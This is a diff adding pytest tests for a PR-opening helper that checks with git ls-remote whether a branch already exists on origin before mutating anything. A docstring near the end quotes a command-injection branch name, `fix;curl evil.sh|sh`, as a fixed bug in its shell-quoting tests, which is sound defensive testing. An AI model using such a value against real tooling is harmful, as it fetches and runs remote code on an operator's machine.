@@ -375,6 +375,121 @@ def test_checkout_b_fails_because_branch_already_exists_reports_cleanly(tmp_path
     assert ["git", "checkout", "main"] not in calls
 
 
+def test_remote_branch_exists_reports_already_proposed_before_any_checkout(tmp_path, capsys):
+    """A nightly discovery job is almost always a FRESH clone, so a
+    re-found finding usually has no LOCAL branch collision at all -- the
+    already-proposed branch lives only on `origin`. `git ls-remote
+    --exit-code --heads origin <branch>` exits 0 with a ref on a hit, and
+    that must be checked, and acted on, BEFORE `checkout -b` ever runs."""
+    paths = _make_artifacts(tmp_path)
+    calls = []
+
+    def run(cmd, **kwargs):
+        calls.append(list(cmd))
+
+        class _CP:
+            returncode = 0
+            stdout = (
+                "deadbeef refs/heads/mylonite/gate-x\n"
+                if cmd[:4] == ["git", "ls-remote", "--exit-code", "--heads"]
+                else ""
+            )
+            stderr = ""
+
+        return _CP()
+
+    result = open_or_print_pr(
+        paths,
+        branch="mylonite/gate-x",
+        pr_title="t",
+        pr_body="x",
+        open_pr=True,
+        base="main",
+        _run=run,
+    )
+
+    assert result.opened is False
+    assert result.already_proposed is True
+    assert "already exists on origin" in capsys.readouterr().out
+    assert ["git", "ls-remote", "--exit-code", "--heads", "origin", "mylonite/gate-x"] in calls
+    # The remote hit short-circuits before any mutating call -- not even a
+    # local checkout -b, let alone add/commit/push.
+    assert not any(c[:3] == ["git", "checkout", "-b"] for c in calls)
+    assert not any(c[:2] == ["git", "add"] for c in calls)
+    assert not any(c[:2] == ["git", "commit"] for c in calls)
+    assert not any(c[:2] == ["git", "push"] for c in calls)
+
+
+def test_remote_branch_absent_falls_through_to_the_normal_checkout(tmp_path):
+    """`ls-remote --exit-code` exits 2, with no output, when `origin` is
+    reachable but has no such branch -- a plain miss, not an error. The
+    normal flow (checkout -b, add, commit) must still run."""
+    paths = _make_artifacts(tmp_path)
+    calls = []
+
+    def run(cmd, **kwargs):
+        calls.append(list(cmd))
+
+        class _CP:
+            returncode = 2 if cmd[:4] == ["git", "ls-remote", "--exit-code", "--heads"] else 0
+            stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
+            stderr = ""
+
+        return _CP()
+
+    result = open_or_print_pr(
+        paths,
+        branch="mylonite/gate-x",
+        pr_title="t",
+        pr_body="x",
+        open_pr=True,
+        base="main",
+        _run=run,
+    )
+
+    assert result.already_proposed is False
+    assert ["git", "checkout", "-b", "mylonite/gate-x"] in calls
+    assert ["git", "commit", "-m", "t"] in calls
+
+
+def test_remote_check_indeterminate_falls_through_honestly(tmp_path):
+    """No `origin` remote, or a network failure, both surface as some OTHER
+    `ls-remote` exit code (not 0, not 2). That must never be read as
+    "already proposed" -- it's a guess this check has no business making --
+    so the run falls through to the existing local-only behaviour and
+    proceeds exactly as if the remote had never been asked."""
+    paths = _make_artifacts(tmp_path)
+    calls = []
+
+    def run(cmd, **kwargs):
+        calls.append(list(cmd))
+
+        class _CP:
+            returncode = 128 if cmd[:4] == ["git", "ls-remote", "--exit-code", "--heads"] else 0
+            stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
+            stderr = (
+                "fatal: 'origin' does not appear to be a git repository"
+                if cmd[:4] == ["git", "ls-remote", "--exit-code", "--heads"]
+                else ""
+            )
+
+        return _CP()
+
+    result = open_or_print_pr(
+        paths,
+        branch="mylonite/gate-x",
+        pr_title="t",
+        pr_body="x",
+        open_pr=True,
+        base="main",
+        _run=run,
+    )
+
+    assert result.already_proposed is False
+    assert ["git", "checkout", "-b", "mylonite/gate-x"] in calls
+    assert ["git", "commit", "-m", "t"] in calls
+
+
 def test_printed_command_quotes_every_interpolated_value(tmp_path):
     """DCR-0018: only pr_title was shlex.quote()d, so a branch named
     `fix;curl evil.sh|sh` — a valid git ref — executed when the operator
